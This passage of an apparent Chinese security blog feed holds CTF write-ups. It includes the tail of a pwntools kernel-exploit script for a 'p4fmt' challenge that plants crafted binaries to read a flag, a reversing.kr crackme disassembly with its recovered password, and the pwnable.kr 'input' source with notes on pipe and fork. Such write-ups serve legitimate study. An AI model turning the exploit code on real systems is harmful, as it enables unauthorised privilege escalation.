class="line">    payload += p32(<span class="number">2</span>)</span><br><span class="line">    payload += p64(<span class="number">0x18</span>)</span><br><span class="line">    payload += p64(<span class="number">0x400048</span>)</span><br><span class="line">    payload += p64(<span class="number">0x400000</span>|<span class="number">7</span>)</span><br><span class="line">    payload += p64(<span class="number">0x1000</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64((addr|<span class="number">8</span>)+<span class="number">0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">0x48</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#payload += asm(shellcraft.cat('/flag')+shellcraft.exit())</span></span><br><span class="line">    <span class="keyword">return</span> payload.encode(<span class="string">'base64'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./run.sh'</span>)</span><br><span class="line"><span class="comment">#UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAT3JkaW4=</span></span><br><span class="line">p.sendlineafter(<span class="string">"/ $"</span>,<span class="string">"echo -n 'UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAT3JkaW4=' | base64 -d &gt; ./tmp/Ordin"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"/ $"</span>,<span class="string">"chmod +x ./tmp/Ordin &amp;&amp; ./tmp/Ordin"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length='</span>)</span><br><span class="line">addr = int(p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line">payload = pwn(addr)</span><br><span class="line">cmd = <span class="string">"echo -n '%s' | base64 -d &gt; /tmp/Ordin1 ;chmod +x /tmp/Ordin1"</span> % payload</span><br><span class="line">p.sendlineafter(<span class="string">"/ $"</span>,cmd)</span><br><span class="line">p.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    p.sendline(<span class="string">'/tmp/Ordin1'</span>)</span><br><span class="line">    mm = p.recvuntil(<span class="string">'/ '</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"FLAG"</span> <span class="keyword">in</span> mm <span class="keyword">or</span> <span class="string">"flag"</span> <span class="keyword">in</span> mm :</span><br><span class="line">        log.info(<span class="string">"success"</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">    ans = p.recvuntil(<span class="string">"&gt;"</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    log.info(ans)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接</p><p><a href="https://xz.aliyun.com/t/4574" target="_blank" rel="noopener">Kirin </a><br><a href="https://github.com/OAlienO/OAlienO/blob/705fd61f73703eba65732abcf87cfdbf2644108a/docs/security/pwn/writeups/p4fmt.md" target="_blank" rel="noopener">OAlienO</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;info&quot;&gt;&lt;a href=&quot;#info&quot; class=&quot;headerlink&quot; title=&quot;info&quot;&gt;&lt;/a&gt;&lt;center&gt;info&lt;/center&gt;&lt;/h2&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://leave-Devour.github.io/categories/pwn/"/>
    
    
      <category term="内核pwn" scheme="https://leave-Devour.github.io/tags/%E5%86%85%E6%A0%B8pwn/"/>
    
  </entry>
  
  <entry>
    <title>Easy_crack</title>
    <link href="https://leave-devour.github.io/2019/07/23/%C2%96%C2%96reversing-kr-Easy-crack/"/>
    <id>https://leave-devour.github.io/2019/07/23/%C2%96%C2%96reversing-kr-Easy-crack/</id>
    <published>2019-07-23T13:47:12.000Z</published>
    <updated>2020-02-12T10:32:56.789Z</updated>
    
    <content type="html"><![CDATA[<h2 id="info"><a href="#info" class="headerlink" title="info"></a><center>info</center></h2><a id="more"></a><p><img src="https://raw.githubusercontent.com/leave-Devour/leave-Devour.github.io/master/images/20190723214824.png" alt></p><p><code>猜想</code>：会不会是单纯的一个一个的字符的验证呢？</p><p>放进Ollydbg</p><p><code>查找</code>关键字</p><p><img src="https://raw.githubusercontent.com/leave-Devour/leave-Devour.github.io/master/images/20190723215545.png" alt></p><p>看到congratulation，果断跟进去，断在入口处，这题就ok啦；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">00401080  /$  83EC 64       sub esp,0x64</span><br><span class="line">00401083  |.  57            push edi</span><br><span class="line">00401084  |.  B9 18000000   mov ecx,0x18</span><br><span class="line">00401089  |.  33C0          xor eax,eax</span><br><span class="line">0040108B  |.  8D7C24 05     lea edi,dword ptr ss:[esp+0x5]</span><br><span class="line">0040108F  |.  C64424 04 00  mov byte ptr ss:[esp+0x4],0x0</span><br><span class="line">00401094  |.  6A 64         push 0x64                                ; /Count = 64 (100.)</span><br><span class="line">00401096  |.  F3:AB         rep stos dword ptr es:[edi]              ; |</span><br><span class="line">00401098  |.  66:AB         stos word ptr es:[edi]                   ; |</span><br><span class="line">0040109A  |.  AA            stos byte ptr es:[edi]                   ; |</span><br><span class="line">0040109B  |.  8B7C24 70     mov edi,dword ptr ss:[esp+0x70]          ; |user32.76DC635B</span><br><span class="line">0040109F  |.  8D4424 08     lea eax,dword ptr ss:[esp+0x8]           ; |</span><br><span class="line">004010A3  |.  50            push eax                                 ; |Buffer = 00000001</span><br><span class="line">004010A4  |.  68 E8030000   push 0x3E8                               ; |ControlID = 3E8 (1000.)</span><br><span class="line">004010A9  |.  57            push edi                                 ; |hWnd = 01230BE2 (&apos;Easy CrackMe&apos;,class=&apos;#32770&apos;)</span><br><span class="line">004010AA  |.  FF15 9C504000 call dword ptr ds:[&lt;&amp;USER32.GetDlgItemTe&gt;; \GetDlgItemTextA</span><br><span class="line">004010B0  |.  807C24 05 61  cmp byte ptr ss:[esp+0x5],0x61           ;  第二個字符</span><br><span class="line">004010B5  |.  75 7E         jnz short Easy_Cra.00401135</span><br><span class="line">004010B7  |.  6A 02         push 0x2</span><br><span class="line">004010B9  |.  8D4C24 0A     lea ecx,dword ptr ss:[esp+0xA]</span><br><span class="line">004010BD  |.  68 78604000   push Easy_Cra.00406078                   ;  5y</span><br><span class="line">004010C2  |.  51            push ecx</span><br><span class="line">004010C3  |.  E8 88000000   call Easy_Cra.00401150                   ;  第三 第四字符</span><br><span class="line">004010C8  |.  83C4 0C       add esp,0xC</span><br><span class="line">004010CB  |.  85C0          test eax,eax</span><br><span class="line">004010CD  |.  75 66         jnz short Easy_Cra.00401135</span><br><span class="line">004010CF  |.  53            push ebx</span><br><span class="line">004010D0  |.  56            push esi</span><br><span class="line">004010D1  |.  BE 6C604000   mov esi,Easy_Cra.0040606C                ;  R3versing</span><br><span class="line">004010D6  |.  8D4424 10     lea eax,dword ptr ss:[esp+0x10]</span><br><span class="line">004010DA  |&gt;  8A10          /mov dl,byte ptr ds:[eax]                ;  這裡判斷第五個字符到最後</span><br><span class="line">004010DC  |.  8A1E          |mov bl,byte ptr ds:[esi]</span><br><span class="line">004010DE  |.  8ACA          |mov cl,dl</span><br><span class="line">004010E0  |.  3AD3          |cmp dl,bl</span><br><span class="line">004010E2  |.  75 1E         |jnz short Easy_Cra.00401102</span><br><span class="line">004010E4  |.  84C9          |test cl,cl</span><br><span class="line">004010E6  |.  74 16         |je short Easy_Cra.004010FE</span><br><span class="line">004010E8  |.  8A50 01       |mov dl,byte ptr ds:[eax+0x1]</span><br><span class="line">004010EB  |.  8A5E 01       |mov bl,byte ptr ds:[esi+0x1]</span><br><span class="line">004010EE  |.  8ACA          |mov cl,dl</span><br><span class="line">004010F0  |.  3AD3          |cmp dl,bl</span><br><span class="line">004010F2  |.  75 0E         |jnz short Easy_Cra.00401102</span><br><span class="line">004010F4  |.  83C0 02       |add eax,0x2</span><br><span class="line">004010F7  |.  83C6 02       |add esi,0x2</span><br><span class="line">004010FA  |.  84C9          |test cl,cl</span><br><span class="line">004010FC  |.^ 75 DC         \jnz short Easy_Cra.004010DA</span><br><span class="line">004010FE  |&gt;  33C0          xor eax,eax</span><br><span class="line">00401100  |.  EB 05         jmp short Easy_Cra.00401107</span><br><span class="line">00401102  |&gt;  1BC0          sbb eax,eax</span><br><span class="line">00401104  |.  83D8 FF       sbb eax,-0x1</span><br><span class="line">00401107  |&gt;  5E            pop esi</span><br><span class="line">00401108  |.  5B            pop ebx</span><br><span class="line">00401109  |.  85C0          test eax,eax</span><br><span class="line">0040110B  |.  75 28         jnz short Easy_Cra.00401135</span><br><span class="line">0040110D  |.  807C24 04 45  cmp byte ptr ss:[esp+0x4],0x45           ;  第一個字符</span><br><span class="line">00401112  |.  75 21         jnz short Easy_Cra.00401135</span><br><span class="line">00401114  |.  6A 40         push 0x40                                ; /Style = MB_OK|MB_ICONASTERISK|MB_APPLMODAL</span><br><span class="line">00401116  |.  68 58604000   push Easy_Cra.00406058                   ; |EasyCrackMe</span><br><span class="line">0040111B  |.  68 44604000   push Easy_Cra.00406044                   ; |Congratulation !!</span><br><span class="line">00401120  |.  57            push edi                                 ; |hOwner = 01230BE2 (&apos;Easy CrackMe&apos;,class=&apos;#32770&apos;)</span><br><span class="line">00401121  |.  FF15 A0504000 call dword ptr ds:[&lt;&amp;USER32.MessageBoxA&gt;&gt;; \MessageBoxA</span><br><span class="line">00401127  |.  6A 00         push 0x0                                 ; /Result = 0x0</span><br><span class="line">00401129  |.  57            push edi                                 ; |hWnd = 01230BE2 (&apos;Easy CrackMe&apos;,class=&apos;#32770&apos;)</span><br><span class="line">0040112A  |.  FF15 A4504000 call dword ptr ds:[&lt;&amp;USER32.EndDialog&gt;]  ; \EndDialog</span><br><span class="line">00401130  |.  5F            pop edi</span><br><span class="line">00401131  |.  83C4 64       add esp,0x64</span><br><span class="line">00401134  |.  C3            retn</span><br><span class="line">00401135  |&gt;  6A 10         push 0x10                                ; /Style = MB_OK|MB_ICONHAND|MB_APPLMODAL</span><br><span class="line">00401137  |.  68 58604000   push Easy_Cra.00406058                   ; |EasyCrackMe</span><br><span class="line">0040113C  |.  68 30604000   push Easy_Cra.00406030                   ; |Incorrect Password</span><br><span class="line">00401141  |.  57            push edi                                 ; |hOwner = 01230BE2 (&apos;Easy CrackMe&apos;,class=&apos;#32770&apos;)</span><br><span class="line">00401142  |.  FF15 A0504000 call dword ptr ds:[&lt;&amp;USER32.MessageBoxA&gt;&gt;; \MessageBoxA</span><br><span class="line">00401148  |.  5F            pop edi</span><br><span class="line">00401149  |.  83C4 64       add esp,0x64</span><br><span class="line">0040114C  \.  C3            retn</span><br></pre></td></tr></table></figure><p>最后得出的password就是：<code>Ea5yR3versing</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;info&quot;&gt;&lt;a href=&quot;#info&quot; class=&quot;headerlink&quot; title=&quot;info&quot;&gt;&lt;/a&gt;&lt;center&gt;info&lt;/center&gt;&lt;/h2&gt;
    
    </summary>
    
    
      <category term="RE" scheme="https://leave-Devour.github.io/categories/RE/"/>
    
    
      <category term="reversing.kr" scheme="https://leave-Devour.github.io/tags/reversing-kr/"/>
    
  </entry>
  
  <entry>
    <title>input</title>
    <link href="https://leave-devour.github.io/2019/07/23/Pwnable-kr-input/"/>
    <id>https://leave-devour.github.io/2019/07/23/Pwnable-kr-input/</id>
    <published>2019-07-23T11:55:39.000Z</published>
    <updated>2020-02-12T10:33:08.598Z</updated>
    
    <content type="html"><![CDATA[<h2 id="info"><a href="#info" class="headerlink" title="info"></a><center>info</center></h2><a id="more"></a><p>源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//argc</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line">FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// here's your flag</span></span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出前面有5个地方需要绕过的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1：就是argc和argv</span><br><span class="line">2：stdin和stderr</span><br><span class="line">3：env</span><br><span class="line">4：存在文件\x0a </span><br><span class="line">5：socket通信</span><br></pre></td></tr></table></figure><p>记录下一些get到的知识点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1、用pipe创建管道，试两个进程间进行通信</span><br><span class="line">2、用fork创建进程</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> writepipe[<span class="number">2</span>] = &#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;, <span class="comment">/* parent -&gt; child */</span></span><br><span class="line">    readpipe [<span class="number">2</span>] = &#123;<span class="number">-1</span>,<span class="number">-1</span>&#125;; <span class="comment">/* child -&gt; parent */</span></span><br><span class="line"><span class="keyword">pid_t</span>   childpid;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * CREATE THE PAIR OF PIPES</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Pipes have two ends but just one direction: to get a two-way</span></span><br><span class="line"><span class="comment"> * conversation you need two pipes. It's an error if we cannot make</span></span><br><span class="line"><span class="comment"> * them both, and we define these macros for easy reference.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">writepipe[<span class="number">0</span>] = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( pipe(readpipe) &lt; <span class="number">0</span>  ||  pipe(writepipe) &lt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* FATAL: cannot create pipe */</span></span><br><span class="line">    <span class="comment">/* close readpipe[0] &amp; [1] if necessary */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PARENT_READ readpipe[0]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHILD_WRITE readpipe[1]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHILD_READ  writepipe[0]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PARENT_WRITE    writepipe[1]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( (childpid = fork()) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* FATAL: cannot fork child */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( childpid == <span class="number">0</span> )   <span class="comment">/* in the child */</span></span><br><span class="line">&#123;</span><br><span class="line">    close(PARENT_WRITE);</span><br><span class="line">    close(PARENT_READ);</span><br><span class="line"></span><br><span class="line">    dup2(CHILD_READ,  <span class="number">0</span>);  close(CHILD_READ);</span><br><span class="line">    dup2(CHILD_WRITE, <span class="number">1</span>);  close(CHILD_WRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* do child stuff */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>                <span class="comment">/* in the parent */</span></span><br><span class="line">&#123;</span><br><span class="line">    close(CHILD_READ);</span><br><span class="line">    close(CHILD_WRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* do parent stuff */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">首先fork()创建的进程(&quot;即当前的进程的镜像&quot;),两者的初始状态一样，执行互不干扰。</span><br><span class="line">另外fork() 复制程序时不是从** #include **处开始复制的，因为fork是把进程当前的情况拷贝一份，所以执行fork()，前面的已经执行完了，fork()只拷贝下一行代码到新进程。</span><br><span class="line"></span><br><span class="line">pipe(int fd[2])函数可以得到两个file descriptors 形成一个单向的pipe,fd[0]固定为读端，fd[1]固定为写端。</span><br><span class="line"></span><br><span class="line">另外 execv家族有很多，其中的execve()可以控制传进去的envp,env</span><br><span class="line">int execve(const char *filename, char *const argv[ ], char *const envp[ ]);</span><br></pre></td></tr></table></figure><p><a href="http://unixwiz.net/techtips/remap-pipe-fds.html" target="_blank" rel="noopener">pipe</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;info&quot;&gt;&lt;a href=&quot;#info&quot; class=&quot;headerlink&quot; title=&quot;info&quot;&gt;&lt;/a&gt;&lt;center&gt;info&lt;/center&gt;&lt;/h2&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://leave-Devour.github.io/categories/pwn/"/>
    
    
      <category term="pwnable.kr" scheme="https://leave-Devour.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
</feed>
